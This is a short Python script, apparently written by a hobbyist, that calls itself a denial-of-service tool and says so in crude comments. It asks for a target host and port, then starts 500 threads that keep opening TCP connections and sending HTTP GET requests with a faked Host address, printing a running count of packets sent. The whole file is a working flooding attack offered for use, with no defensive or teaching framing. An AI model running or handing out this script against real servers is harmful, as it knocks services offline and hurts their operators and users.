# bruh creating a DoS script is easy AF
# importing random shit
import socket, random, os
import threading
# color vars
r = '\033[0;31m'
b = '\033[0;34m'
fake_ip = '182.21.20.32'
attack_num = 0

# this create a banner
os.system('clear')
os.system('toilet -f term --filter metal -w 40 Dinal of Servise | cowsay -f eyes | lolcat')

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num,"packets sent!", end='\r')
        s.close

# i don't now what the fu3k is this
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# input aaa
target = input( r + "Enter Target >>>")
port = int(input(b + "Enter Target's port >>>"))


os.system('clear')
os.system('toilet  --filter border:metal -w 80 Doing DDoS on target | lolcat')
print( r + "Do ctrl+c to Abort")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
